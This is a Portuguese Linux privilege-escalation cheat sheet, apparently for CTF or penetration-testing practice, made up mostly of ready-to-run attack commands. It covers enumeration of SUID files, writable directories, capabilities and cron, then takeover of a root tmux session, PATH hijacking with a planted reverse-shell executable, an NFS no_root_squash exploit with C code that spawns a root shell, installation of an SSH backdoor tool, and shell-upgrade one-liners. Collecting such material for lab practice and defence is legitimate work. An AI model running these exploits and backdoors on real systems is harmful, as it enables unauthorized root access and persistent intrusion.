https://github.com/Herick-Costa/LinRPE/blob/main/LinRPE.sh


# 🔎 Busca de Arquivos e Permissões

## 📂 Busca de arquivos específicos
```bash
find / -name flag2.txt 2>/dev/null
find / -type f -name "*key.txt" 2>/dev/null
dir C:\ /s /b | findstr /i "root.txt"
```
## 🔐 Arquivos com permissões SUID/SGID
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f -ls 2>/dev/null
```

## ⚙️ Executáveis específicos
### 📌 Executáveis do root
```bash
find / -type f -perm -4000 -group $(id -gn) 2>/dev/null
```

### 📌 Executáveis em grupos
```bash
find / -group <nome_do_grupo> -type f -executable 2>/dev/null
```

## 📁 Pastas graváveis
```bash
find / -writable 2>/dev/null
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
```
---

# 🚀 Escalonamento de Privilégios

# 🔍 Capacidades (Capabilities)
```bash
getcap -r / 2>/dev/null
```

---

# ⏳ Cronjobs
```bash
cat /etc/crontab
```

---

# 🛠 Ferramentas e Recursos

## Verificação de processos | PS
```bash
ps -eo pid,ppid,user,cmd
```
### Executando linpeas na sessão 'Processes whose PPID belongs to a different user (not root)
![image](https://github.com/user-attachments/assets/dee4c2cb-0f09-4917-aae8-281ce16d13a3)

### Exemplo onde encontramos o tmux iniciado por user rodando como root (no linpeas mostra o 2385)
```bash
ps -eo pid,ppid,user,cmd | grep 2385 
```
![image](https://github.com/user-attachments/assets/abd1eb08-1c16-4870-b72a-768ba19084d2)

```bash
tmux ls  
```
![image](https://github.com/user-attachments/assets/2bd3fdac-aef5-4c16-b9d2-4c495cba095f)

### Tomando conta:
```bash
tmux attach-session -t 0  
```

## 📌 Exploração de PATH
### 🔍 Examinando o PATH
```bash
echo $PATH
export PATH=/tmp:$PATH
export PATH=/tmp
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
```

### 🔹 Estratégia
1. Verificar quais pastas no `$PATH` são graváveis.
2. Adicionar um executável falso em `/tmp` com uma shell reversa.

## 🖧 NFS (Network File System)
### 🔍 Configuração crítica
Verifique no `/etc/exports` a opção `no_root_squash`.

### 🛠 Procedimento
```bash
showmount -e <ip>
mkdir /tmp/v
mount -o rw <ip>:/tmp /tmp/v
```

### 📝 Código para exploração
```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
gcc nfs.c -o nfs -w -static
chmod +s nfs
```

# 🛠 SSH Backdoor
```bash
git clone https://github.com/NinjaJc01/ssh-backdoor
cd ssh-backdoor
ssh-keygen
id_rsa
chmod +x backdoor
./backdoor -a
```
---

# 🛠 Expondo Serviços com Túneis SSH Reversos

## 📌 Listar portas em uso
```bash
ss -tulpn
```

## Cache ARP – Últimos IPs na rede local
```bash
ip neigh show
```
Exemplo de saída:

Copiar
Editar
192.168.0.12 dev eth0 lladdr 00:11:22:33:44:55 REACHABLE
Isso mostra IPs que sua máquina descobriu via rede local recentemente (ainda que não esteja mais se comunicando).

# 🔥 Melhorando Shells

## 🐧Linux
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
```bash
export TERM=xterm
^Z
stty raw -echo; fg
reset
```
```bash
script /dev/null
/bin/sh -i
```
